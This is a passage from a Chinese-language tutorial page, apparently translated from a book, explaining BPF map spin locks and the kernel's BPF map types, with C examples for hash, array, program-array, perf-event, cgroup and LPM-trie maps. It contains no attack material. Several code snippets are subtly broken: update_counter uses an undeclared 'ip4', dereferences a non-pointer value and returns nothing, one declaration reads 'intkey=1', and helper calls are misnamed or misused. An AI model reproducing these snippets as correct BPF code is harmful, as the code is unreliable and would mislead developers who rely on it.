class="keyword">struct</span> <span class="title">bpf_spin_lock</span> <span class="title">semaphore</span>;</span> </span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会把这个结构存储在<code>BPF map</code>中，并在元素中使用信号量来防止对它的不当访问。 现在，我们可以声明将包含这些元素的<code>map</code>。 此<code>map</code>必须使用BPF类型格式(BTF)进行注释，以便验证器知道结构。 类型格式通过向二进制对象添加调试信息，使内核和其他工具对BPF数据结构有更丰富的理解。因为这段代码将在内核中运行，我们可以使用<code>libbpf</code>提供的内核宏来注释这个并发映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> concurrent_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(struct concurrent_element), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">&#125;;</span><br><span class="line">BPF_ANNOTATE_KV_PAIR(concurrent_map, <span class="keyword">int</span>, struct concurrent_element);</span><br></pre></td></tr></table></figure><p>在BPF程序中，我们可以使用两个锁辅助函数来保护这些元素免受竞争条件的影响。即使信号量被锁定，我们的程序也保证能够安全地修改元素的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> <span class="title">init_value</span> = &#123;</span>&#125;; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> *<span class="title">read_value</span>;</span></span><br><span class="line">  bpf_map_create_elem(&amp;concurrent_map, &amp;key, &amp;init_value, BPF_NOEXIST);</span><br><span class="line">  read_value = bpf_map_lookup_elem(&amp;concurrent_map, &amp;key);</span><br><span class="line">  bpf_spin_lock(&amp;read_value-&gt;semaphore);</span><br><span class="line">  read_value-&gt;count += <span class="number">100</span>;</span><br><span class="line">  bpf_spin_unlock(&amp;read_value-&gt;semaphore);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码通过初始化我们的并发映射来锁定对其值的访问。 然后，它从映射中获取该值并锁定其信号量，以便它可以保存计数值，从而防止数据竞争。 使用完该值后，它会释放锁，以便其他映射可以安全地访问该元素。</p><p>在用户空间，我们可以通过使用标志<code>BPF_F_LOCK</code>来保存对并发映射中元素的引用。你可以将此标志与<code>bpf_map_update_elem</code>和<code>bpf_map_lookup_elem_flags</code>辅助函数一起使用。 这个标志允许你更新元素而不用担心数据竞争。</p><p>自旋锁并不总是有用。 如果您只是在<code>map</code>中聚合值，则不需要使用自旋锁。 但是，如果你想确保并发程序在对它们执行多个操作时不会更改映射中的元素，从而保持原子性，那么自旋锁就很有用。</p><h3 id="BPF映射类型"><a href="#BPF映射类型" class="headerlink" title="BPF映射类型"></a>BPF映射类型</h3><h4 id="哈希表映射"><a href="#哈希表映射" class="headerlink" title="哈希表映射"></a>哈希表映射</h4><p>哈希表映射是第一个添加到BPF的通用映射。 它们使用<code>BPF_MAP_TYPE_HASH</code>类型定义。你可以使用任何大小的键和值， 内核会根据需要分配和释放它们。当你在哈希表映射上使用<code>bpf_map_update_elem</code>时，内核会自动替换元素。哈希表映射经过优化，查找速度非常快，它们对于保存经常读取的结构化数据很有用。让我们看一个使用它们来跟踪网络IP及其速率限制的示例程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> IPV4_FAMILY 1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> &#123;</span> </span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">        __u32 v4_addr;</span><br><span class="line">        __u8 v6_addr[<span class="number">16</span>];</span><br><span class="line">      &#125;;</span><br><span class="line">      __u8 family;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> counters </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(struct ip_key), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这段代码中，我们声明了一个结构化的<code>key</code>，我们将使用它来保存有关IP地址的信息。 我们定义了我们的程序将用来跟踪速率限制的映射。你可以看到我们在此映射中使用IP地址作为键。 这些值将是我们的BPF程序从特定IP地址接收网络数据包的频率次数。</p><p>我们可以编写一个代码片段来更新内核中的这些计数器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">update_counter</span><span class="params">(<span class="keyword">uint32_t</span> ipv4)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">uint64_t</span> value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> <span class="title">key</span> = &#123;</span>&#125;;</span><br><span class="line">key.v4_addr = ip4;</span><br><span class="line">key.family = IPV4_FAMILY;</span><br><span class="line">  bpf_map_lookup_elem(counters, &amp;key, &amp;value);</span><br><span class="line">  (*value) += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数获取从网络数据包中提取的IP地址，并使用我们声明的复合键执行映射查找。 在这种情况下，我们假设我们之前已经用零值初始化了计数器； 否则，<code>bpf_map_lookup_elem</code>调用将返回一个负数。</p><h4 id="数组映射"><a href="#数组映射" class="headerlink" title="数组映射"></a>数组映射</h4><p>数组映射是添加到内核的第二种类型的BPF映射。 它们使用<code>BPF_MAP_TYPE_ARRAY</code>类型定义。 当你初始化一个数组映射时，它的所有元素都预先分配在内存中并设置为零值。 因为这些映射是由一个元素切片支持的，所以键是数组中的索引，它们的大小必须正好是四个字节。使用数组映射的一个缺点是无法删除映射中的元素，并且无法使数组小于实际值。如果你尝试在数组映射上使用<code>map_delete_elem</code>，调用将失败，结果会收到错误<code>EINVAL</code>。</p><p>数组映射通常用于存储可以改变值的信息，但它的行为通常是固定的。 人们使用它来存储具有预定义分配规则的全局变量。因为你不能删除元素，所以可以假设特定位置的元素总是代表同一个元素。要记住的另一件事是<code>map_update_elem</code>不是原子的，就像你在哈希表映射中看到的那样。如果正在进行更新，同一程序可以同时从同一位置读取不同的值。 如果将计数器存储在数组映射中，则可以使用内核的内置函数<code>__sync_fetch_and_add</code>对映射的值执行原子操作。</p><h4 id="程序数组映射"><a href="#程序数组映射" class="headerlink" title="程序数组映射"></a>程序数组映射</h4><p>程序数组映射是第一个添加到内核的专用映射。它们使用<code>BPF_MAP_TYPE_PROG_ARRAY</code>类型定义。 你可以使用这种类型的映射来存储对BPF程序的文件描述符标识符的引用。 与辅助函数<code>bpf_tail_call</code>结合使用，此映射允许你在程序之间跳转，绕过单个BPF程序的最大指令限制并降低复杂性。</p><p>使用此专用映射时需要考虑一些事项。要记住的第一个方面是键和值的大小都必须是四个字节。要记住的第二个方面是，当你跳转到一个新程序时，新程序将重用相同的内存堆栈，因此程序不会消耗所有可用内存。最后，如果你尝试跳转到映射中不存在的程序，则尾调用将失败，当前程序将继续执行。让我们深入研究一个详细的示例，以了解如何更好地使用这种类型的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> programs </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PROG_ARRAY, </span><br><span class="line">  .key_size = <span class="number">4</span>,</span><br><span class="line">.value_size = <span class="number">4</span>,</span><br><span class="line">  .max_entries = <span class="number">1024</span>,</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>首先，我们需要声明我们的新程序映射（正如我们前面提到的，键和值的大小总是四个字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intkey=<span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] = &#123;</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>), <span class="comment">// assign r0 = 0</span></span><br><span class="line">BPF_EXIT_INSN(), <span class="comment">// return r0 </span></span><br><span class="line">&#125;;</span><br><span class="line">prog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, prog, <span class="keyword">sizeof</span>(prog), <span class="string">"GPL"</span>); </span><br><span class="line">bpf_map_update_elem(&amp;programs, &amp;key, &amp;prog_fd, BPF_ANY);</span><br></pre></td></tr></table></figure><p>我们需要声明我们要跳转到的程序。 在这种情况下，我们正在编写一个BPF程序，其唯一目的是返回0。我们使用<code>bpf_prog_load</code>将其加载到内核中，然后将其文件描述符标识符添加到我们的程序映射中。</p><p>现在我们已经存储了该程序，我们可以编写另一个将跳转到它的BPF程序。 BPF程序只有在同类型的情况下才能跳转到其他程序，在这种情况下，我们将程序附加到<code>kprobe</code>跟踪</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/seccomp_phase1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_kprobe_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">1</span>;</span><br><span class="line"><span class="comment">/* dispatch into next BPF program */</span> </span><br><span class="line">  bpf_tail_call(ctx, &amp;programs, &amp;key);</span><br><span class="line">  <span class="comment">/* fall through when the program descriptor is not in the map */</span></span><br><span class="line"><span class="keyword">char</span> fmt[] = <span class="string">"missing program in prog_array map\n"</span>; </span><br><span class="line">  bpf_trace_printk(fmt, <span class="keyword">sizeof</span>(fmt));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>bpf_tail_call</code>和<code>BPF_MAP_TYPE_PROG_ARRAY</code>最多可以链接 32 个嵌套调用。 这样可以防止无限循环和内存耗尽。</p><h4 id="Perf事件数组映射"><a href="#Perf事件数组映射" class="headerlink" title="Perf事件数组映射"></a>Perf事件数组映射</h4><p>这些类型的映射将<code>perf_events</code>数据存储在环形缓冲区中，该环形缓冲区在BPF程序和用户空间程序之间进行实时通信。 它们使用<code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code>类型定义。 旨在将内核跟踪工具发出的事件转发给用户空间程序以做进一步处理。用户空间程序充当监听器，等待来自内核的事件，因此你需要确保你写的代码在内核中的BPF程序初始化之前开始监听。</p><p>让我们看一个示例，说明如何跟踪计算机执行的所有程序。 在进入BPF程序代码之前，我们需要声明我们将从内核发送到用户空间的事件结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="keyword">char</span> program_name[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在，我们需要创建将事件发送到用户空间的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> events </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PERF_EVENT_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(u32), </span><br><span class="line">  .max_entries = <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们声明了数据类型和映射后，我们可以创建捕获数据并将其发送到用户空间的BPF程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/sys_exec"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_capture_exec</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">data_t</span> data;</span><br><span class="line"><span class="comment">// bpf_get_current_pid_tgid returns the current process identifier </span></span><br><span class="line">  data.pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>;</span><br><span class="line">  <span class="comment">// bpf_get_current_comm loads the current executable name</span></span><br><span class="line">bpf_get_current_comm(&amp;data.program_name, <span class="keyword">sizeof</span>(data.program_name)); </span><br><span class="line">  bpf_perf_event_output(ctx, &amp;events, <span class="number">0</span>, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此代码段中，我们使用<code>bpf_perf_event_output</code>将数据附着到<code>map</code>中。 因为这是一个实时缓冲区，所以你不必担心<code>map</code>中元素的键，内核负责将新元素添加到<code>map</code>并在用户空间程序处理它后刷新它。</p><h4 id="Per-CPU哈希映射"><a href="#Per-CPU哈希映射" class="headerlink" title="Per-CPU哈希映射"></a>Per-CPU哈希映射</h4><p>这种类型的映射是<code>BPF_MAP_TYPE_HASH</code>的改进版本。 这些映射使用<code>BPF_MAP_TYPE_PERCPU_HASH</code>类型定义。 当你分配其中一个映射时，每个CPU都会看到它自身隔离版本的映射，这使得高性能查找和聚合更加高效。 如果你的BPF程序收集指标并将它们聚合到哈希表映射中，使用这种类型的映射就很有用。</p><h4 id="Per-CPU数组映射"><a href="#Per-CPU数组映射" class="headerlink" title="Per-CPU数组映射"></a>Per-CPU数组映射</h4><p>这种类型的地图也是<code>BPF_MAP_TYPE_ARRAY</code>的改进版本。 它们使用<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型定义。</p><h4 id="堆栈跟踪映射"><a href="#堆栈跟踪映射" class="headerlink" title="堆栈跟踪映射"></a>堆栈跟踪映射</h4><p>这种类型的映射存储正在运行的进程的堆栈跟踪。 它们使用<code>BPF_MAP_TYPE_STACK_TRACE</code>类型定义。 除了这个映射，内核开发人员已经添加了帮助程序<code>bpf_get_stackid</code>来帮助你使用堆栈跟踪填充这个映射。此帮助程序将映射作为参数和一系列标志，以便你可以指定是否只需要来自内核、只来自用户空间或两者的跟踪。帮助器返回与添加到<code>map</code>中的元素关联的键。</p><h4 id="Cgroup数组映射"><a href="#Cgroup数组映射" class="headerlink" title="Cgroup数组映射"></a>Cgroup数组映射</h4><p>这种类型的映射存储对<code>cgroups</code>的引用。<code>Cgroup</code>数组映射使用<code>BPF_MAP_TYPE_CGROUP_ARRAY</code>类型定义。 本质上，它们的行为类似于<code>BPF_MAP_TYPE_PROG_ARRAY</code>，但它们存储指向<code>cgroup</code>的文件描述符标识符。</p><p>当你希望在<code>BPF map</code>之间共享<code>cgroup</code>引用以控制流量、调试和测试时，该映射会非常有用。 让我们看一个如何填充此映射的示例。 我们从映射定义开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> cgroups_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_CGROUP_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), </span><br><span class="line">  .max_entries = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以通过打开包含<code>cgroup</code>信息的文件来拿到<code>cgroup</code>的文件描述符。 我们将打开控制<code>Docker</code>容器的基本CPU额度的<code>cgroup</code>，并将该<code>cgroup</code>存储在我们的映射中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cgroup_fd, key = <span class="number">0</span>;</span><br><span class="line">cgroup_fd = open(<span class="string">"/sys/fs/cgroup/cpu/docker/cpu.shares"</span>, O_RDONLY);</span><br><span class="line">bpf_update_elem(&amp;cgroups_map, &amp;key, &amp;cgroup_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="LRU哈希和Per-CPU哈希映射"><a href="#LRU哈希和Per-CPU哈希映射" class="headerlink" title="LRU哈希和Per-CPU哈希映射"></a>LRU哈希和Per-CPU哈希映射</h4><p>这两种类型的映射是哈希表映射，但它们也实现了内部LRU缓存。 LRU代表最近最少使用，这意味着如果映射已满，这些映射将删除不经常使用的元素，以便为映射中的新元素腾出空间。 因此，你可以使用这些映射来插入超出最大限制的元素，只要不介意丢失最近未使用的元素。 它们使用<code>BPF_MAP_TYPE_LRU_HASH</code>和<code>BPF_MAP_TYPE_LRU_PERCPU_HASH</code>类型定义。</p><p>此映射的<code>per cpu</code>版本与之前看到的其他<code>per cpu</code>映射略有不同。 该映射只保留一个哈希表来存储映射中的所有元素，并且每个CPU使用不同的LRU缓存，这样可以确保每个CPU中最常用的元素保留在映射中。</p><h4 id="LPM-Trie映射"><a href="#LPM-Trie映射" class="headerlink" title="LPM Trie映射"></a>LPM Trie映射</h4><p><code>LPM trie</code>映射是使用最长前缀匹配(LPM)来查找映射中元素的映射类型。LPM是一种算法，它从树中的任何其他匹配项中选择与最长查找键匹配的元素。此算法用于保留流量转发表以将IP地址与特定路由的路由器和其他设备进行匹配。 这些映射使用<code>BPF_MAP_TYPE_LPM_TRIE</code>类型定义。</p><p>这些映射要求<code>key</code>的大小为8的倍数，范围为8到2048。 如果你不想实现自己的<code>key</code>，内核提供了一个结构体，可以将其用于这些<code>keys</code>，称为<code>bpf_lpm_trie_key</code>。</p><p>在下一个示例中，我们将两个转发路由添加到映射并尝试将IP地址匹配到正确的路由。 首先我们需要创建映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> routing_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_LPM_TRIE,</span><br><span class="line">.key_size = <span class="number">8</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">10000</span>,</span><br><span class="line">  .map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们将使用三个转发路由填充此映射: <code>192.168.0.0/16、192.168.0.0/24 和 192.168.1.0/24</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> value_1 = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_1</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">16</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_2 = <span class="number">2</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_2</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_3 = <span class="number">3</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_3</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;;</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_1, &amp;value_1, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_2, &amp;value_2, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_3, &amp;value_3, BPF_ANY);</span><br></pre></td></tr></table></figure><p>现在，我们使用相同的<code>keys</code>结构来查找IP地址<code>192.168.1.1/32</code>的正确匹配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">lookup</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, .prefixlen = <span class="number">32</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ret = bpf_map_lookup_elem(&amp;routing_map, &amp;lookup, &amp;result); </span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, result);</span><br></pre></td></tr></table></figure><p>在此示例中，<code>192.168.0.0/16</code>和<code>192.168.1.0/24</code>都可以匹配查找IP，因为该IP都在这两个范围内。 但是，由于该映射使用LPM 算法，结果将填充键为<code>192.168.1.0/24</code>的值。</p><h4 id="数组映射和哈希映射"><a href="#数组映射和哈希映射" class="headerlink" title="数组映射和哈希映射"></a>数组映射和哈希映射</h4><p><code>BPF_MAP_TYPE_ARRAY_OF_MAPS</code>和<code>BPF_MAP_TYPE_HASH_OF_MAPS</code>是存储对其它映射的引用的两种类型的映射。 它们仅支持一级间接引用，因此不能使用它们来存储映射的映射的映射。 这可确保不会因意外存储无限链式映射而消耗所有内存。</p><p>当你希望在运行时替换整个映射时，这些类型的映射很有用。 如果你的所有映射都是全局映射的子集，那么可以创建全状态快照。 内核确保父映射中的任何更新操作都等到所有旧的子映射的引用都被删除后才完成操作。</p><h4 id="Device-Map映射"><a href="#Device-Map映射" class="headerlink" title="Device Map映射"></a>Device Map映射</h4><p>这种特殊类型的映射存储对网络设备的引用。这些映射使用<code>BPF_MAP_TYPE_DEVMAP</code>类型定义。 它们对想在内核级别操纵流量的网络应用程序很有用。你可以构建指向特定网络设备的端口虚拟映射，然后使用帮助器<code>bpf_redirect_map</code>重定向数据包。</p><h4 id="CPU-Map映射"><a href="#CPU-Map映射" class="headerlink" title="CPU Map映射"></a>CPU Map映射</h4><p><code>BPF_MAP_TYPE_CPUMAP</code>是另一种允许转发网络流量的映射。在这种情况下，映射存储对主机中不同CPU的引用。 与之前的映射类型一样，你可以将其与<code>bpf_redirect_map</code>帮助程序一起使用来重定向数据包。但是，此映射将数据包发送到不同的CPU。这允许将特定CPU分配给网络堆栈以实现可扩展性和隔离目的。</p><h4 id="Open-Socket映射"><a href="#Open-Socket映射" class="headerlink" title="Open Socket映射"></a>Open Socket映射</h4><p><code>BPF_MAP_TYPE_XSKMAP</code>是一种存储对打开套接字的引用的映射。 与之前的映射一样，这些映射对于套接字之间转发数据包很有用。</p><h4 id="Socket-Array和Hash映射"><a href="#Socket-Array和Hash映射" class="headerlink" title="Socket Array和Hash映射"></a>Socket Array和Hash映射</h4><p><code>BPF_MAP_TYPE_SOCKMAP</code>和<code>BPF_MAP_TYPE_SOCKHASH</code>是两个专门的映射，它们存储对内核中打开套接字的引用。 与前面的映射一样，这种类型的映射与帮助程序<code>bpf_redirect_map</code>一起使用，将套接字缓冲区从当前XDP程序转发到不同的套接字。</p><p>它们的主要区别在于其中一个使用数组来存储套接字，而另一个使用哈希表。使用哈希表的好处是你可以直接通过它的键访问一个套接字，而不需要遍历完整的映射来找到它。内核中的每个套接字都由一个五元组键标识。 这五个元组包含建立双向网络连接所需的信息。 当使用此映射的哈希表版本时，你可以将此键用作映射中的查找键。</p><h4 id="Cgroup-Storage-and-Per-CPU-Storage映射"><a href="#Cgroup-Storage-and-Per-CPU-Storage映射" class="headerlink" title="Cgroup Storage and Per-CPU Storage映射"></a>Cgroup Storage and Per-CPU Storage映射</h4><p>引入这两种类型的映射是为了帮助开发人员使用附着到<code>cgroup</code>的BPF程序。 你可以将BPF程序与控制组连接和分离，并使用<code>BPF_PROG_TYPE_CGROUP_SKB</code>将它们的运行时隔离到特定的<code>cgroup</code>。 这两个映射使用 <code>BPF_MAP_TYPE_CGROUP_STORAGE</code>和<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>类型定义。</p><p>从开发人员的角度来看，这些类型的映射类似于哈希表映射。内核提供了一个结构助手来为这个映射生成键，<code>bpf_cgroup_storage_key</code>，其中包括有关<code>cgroup</code>节点标识符和附加类型的信息。 你可以在此映射中添加任何想要的值，它的访问权限将仅限于附加<code>cgroup</code>内的BPF程序。</p><p>这些映射有两个限制。首先是你不能从用户空间在映射中创建新元素。内核中的BPF程序可以使用<code>bpf_map_update_elem</code>创建元素，但是如果你在用户空间使用此方法并且<code>key</code>不存在，则    <code>bpf_map_update_elem</code>将失败，并且<code>errno</code>将被设置为<code>ENOENT</code>。 第二个限制是你不能从此映射中删除元素。<code>bpf_map_delete_elem</code>总是失败并将<code>errno</code>设置为<code>EINVAL</code>。</p><p>这两种类型的映射之间的主要区别是<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>为每个CPU保留不同的哈希表。</p><h4 id="Reuseport-Socket映射"><a href="#Reuseport-Socket映射" class="headerlink" title="Reuseport Socket映射"></a>Reuseport Socket映射</h4><p>这种特殊类型的映射存储对系统中的开放端口重用的套接字的引用。它们使用<code>BPF_MAP_TYPE_REUSE PORT_SOCKARRAY</code>类型定义。这些映射主要用于<code>BPF_PROG_TYPE_SK_REUSEPORT</code>程序类型。 结合起来，你可以控制决定如何过滤和处理来自网络设备的传入数据包。例如，可以决定哪些数据包发送到哪个套接字，即使两个套接字都连接到同一个端口。</p><h4 id="Queue映射"><a href="#Queue映射" class="headerlink" title="Queue映射"></a>Queue映射</h4><p>队列映射使用先进先出(FIFO)存储将元素保留在映射中。它们使用<code>BPF_MAP_TYPE_QUEUE</code>类型定义。FIFO意味着当从映射中获取元素时，结果将是映射中存在时间最长的元素。</p><p>对于这种数据结构，bpf映射帮助器以一种可预测的方式工作。当使用<code>bpf_map_lookup_elem</code>时，此映射始终在映射中查找最旧的元素。 当使用<code>bpf_map_update_elem</code>时，此映射始终将元素附加到队列的末尾，因此你需要先读取映射中的其余元素，然后才能获取此元素。 当然你还可以使用帮助程序<code>bpf_map_lookup_and_delete</code>获取较旧的元素并以原子方式将其从映射中删除。此映射不支持帮助函数<code>bpf_map_delete_elem</code>和<code>bpf_map_get_next_key</code>。 